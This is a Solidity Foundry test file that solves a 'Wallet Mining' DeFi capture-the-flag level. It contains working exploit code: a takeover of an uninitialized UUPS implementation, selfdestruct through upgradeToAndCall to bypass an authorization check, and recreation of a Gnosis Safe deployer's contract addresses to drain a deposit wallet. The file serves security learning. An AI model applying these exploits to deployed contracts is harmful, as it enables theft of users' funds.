// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {GnosisSafeProxyFactory} from "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import {GnosisSafeProxy} from "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";

import {AuthorizerUpgradeable} from "../../src/wallet-mining/AuthorizerUpgradeable.sol";
import {WalletMiningLevel} from "../../src/wallet-mining/WalletMiningLevel.sol";

import "forge-std/Test.sol";

contract AttackerWallet {
  function transfer(address token, address to, uint256 amount) external {
    IERC20(token).transfer(to, amount);
  }
}

// Has to be UUPSUpgradeable to be used at upgradeToAndCall().
contract AttackerImplementation is UUPSUpgradeable {
  address payable zeroAddr = payable(
    address(0x0000000000000000000000000000000000000000)
  );

  function attack() external {
    selfdestruct(zeroAddr);
  }

  // Needed function in order to be compliant with UUPSUpgradeable
  function _authorizeUpgrade(address imp) internal override {}
}

contract WalletMiningTest is Test {
  WalletMiningLevel level = new WalletMiningLevel();

  function setUp() public {
    level.setup();

    // This level's solution involves `selfdestruct`, and due to forge's
    // limitations, we must run one task preparation in the `setUp()` function.

    // 1. Drain the deposit address 0x9B6fb6.
    //   1.1 Deploy the Gnosis Safe 0x76E2cF at this chain via replay attack.
    //   1.2 Deploy the master copy 0x34CfAC at this chain via replay attack.
    //   1.3 Generate a wallet from a custom contract with the address 0x9B6fb6.
    task1();

    // 2. Drain the walletDeployer contract.
    //   2.1 Gain ownership of the implementation contract.
    //   2.2 Exploit `upgradeToAndCall` to destroy this contract.
    task2Preparation();
    //   2.3 Call walletDeployer's `drop` to drain it.
    //
    // Now is when we can add our code at `testExploit()` below.
  }

  function testExploit() public {
    // The execution is just a loop to drain the walletDeployer contract.
    for (uint8 i = 0; i < 43; i++) {
      level.walletDeployer().drop("");
    }
    IERC20(address(level.token()))
      .transfer(level.playerAddress(), 43 ether);

    // We are (finally) done. Let's validate our attacks.
    level.validate();
  }

  function task1() private {
    GnosisSafeProxyFactory factory;
    GnosisSafeProxy wallet;
    AttackerWallet attackerWallet;

    // Our assumption is that this is an undeployed Gnosis Safe wallet.
    // The Gnosis Safe Factory is at 0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B.
    // We are informed that this contract is not deployed.

    // The first approach to the solution happens by looking at etherscan,
    // we find the deployer, which in etherscan is identified as "Safe: Deployer 3"
    address gnosisDeployer = 0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A;

    // At etherscan there is the raw transaction.
    // Pre EIP-155 we could just replay the transaction in other networks,
    // which is what happened at Optimism with Gnosis Safe.
    //
    // In this exercise, we will just leverage the found deployer address
    // to deploy the factory and the master copy.
    // The latter is a requirement to solve the level.
    // Notice that we don't need to use the Gnosis Proxy, but we will
    // be using a custom contract to be able to drain the funds.
    vm.startPrank(gnosisDeployer);

    // By inspecting the deployer address transactions at etherscan
    // we learn that the nonces for each address are:
    // - 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F     0
    // - 0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B     2
    attackerWallet = new AttackerWallet();
    vm.setNonce(gnosisDeployer, 2);
    factory = new GnosisSafeProxyFactory();

    vm.stopPrank();
    // With the factory set, we deploy our attacking wallet.
    //
    // First of all, we have to explain why we could get away with
    // deploying a custom contract as a wallet.
    // If we look at GnosisSafeProxyFactory.sol we find that the function
    // createProxy() does
    // proxy = new GnosisSafeProxy(singleton);
    // that is, they use the `CREATE` opcode, where the new address is
    // keccak256(sender, nonce).
    //
    // So with the (commented) code below we will brute force the creation
    // of wallets until we find the appropiate nonce.
    /*
    for (uint8 i = 0; i < 100; i++) {
      wallet = factory.createProxy(address(attacker), "");
      if ((address(wallet)) == 0x9B6fb606A9f5789444c17768c6dFCF2f83563801) {
        break;
      }
    }
    */
    //
    // Having found the nonce, we obtain the wallet.
    vm.setNonce(address(factory), 43);
    wallet = factory.createProxy(address(attackerWallet), "");

    // Now that we have control of this address, we can drain its funds.
    AttackerWallet(address(wallet))
      .transfer(
        address(level.token()),
        level.playerAddress(),
        level.DEPOSIT_TOKEN_AMOUNT());
  }

  function task2Preparation() private {
    AttackerImplementation attackerImpl;

    // The `init()` function is called via the proxy. With the `initializer`
    // modifier, it operates within the proxy's storage context. This allows
    // the function to be invoked directly on the contract.
    //
    // See Open Zeppelin's documentation on proxies:
    // https://docs.openzeppelin.com/contracts/4.x/api/proxy
    //
    // Open Zeppelin advises:
    // 1. Make all initializers idempotent.
    // 2. To secure the `init()` in the implementation contract against direct
    //    use, invoke `_disableInitializers` in the constructor to lock it at
    //    deployment.
    //
    // Ownership of the implementation transfers to us post-call.
    AuthorizerUpgradeable authorizer = AuthorizerUpgradeable(address(level.implementation()));
    address[] memory param01 = new address[](1);
    param01[0] = 0x0000000000000000000000000000000000000000;
    address[] memory param02 = new address[](1);
    param02[0] = 0x0000000000000000000000000000000000000000;
    authorizer.init(param01, param02);

    // Destroy the implementation contract using a custom contract.
    //
    // This action is linked to the `can()` function in the walletDeployer.
    // After a successful static call to the authorizer proxy, the function
    // checks that:
    // - `returndatasize` is not zero, indicating data was returned.
    // - The returned value is nonzero, meaning `true`.
    //
    // --------------------------------------------------------------------
    //
    //              +---------------------------+
    //              | Is `returndatasize` != 0? |
    //              +---------------------------+
    //          No                | Yes
    //          |                 V
    // +---------------------+   +---------------------------------------+
    // | Pass (move forward) |   | Did the `can` function return `true`? |
    // +---------------------+   +---------------------------------------+
    //                           | No             | Yes
    //                           V                V
    //              +------------------+    +---------------------+
    //              | Return `0`       |    | Pass (move forward) |
    //              +------------------+    +---------------------+
    //
    // --------------------------------------------------------------------
    //
    // After becoming owners via `init()`, we can call `upgradeToAndCall()`. This
    // function makes a delegate call to the provided function. If `selfdestruct()`
    // is called within this function, it will destroy the implementation contract,
    // not the proxy.
    //
    // Thus, when the walletDeployer invokes the proxy, the proxy then makes a
    // delegate call to the implementation contract:
    //
    //   let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
    //
    // Since the implementation was just destroyed, this `delegatecall` will fail
    // (not revert), and the proxy function will produce a `returndatasize` of zero.
    // This outcome enables us to bypass the check and drain the contract.
    //
    attackerImpl = new AttackerImplementation();
    bytes memory data = abi.encodeWithSignature(
      "attack()"
    );
    level.implementation().upgradeToAndCall(address(attackerImpl), data);
  }
}

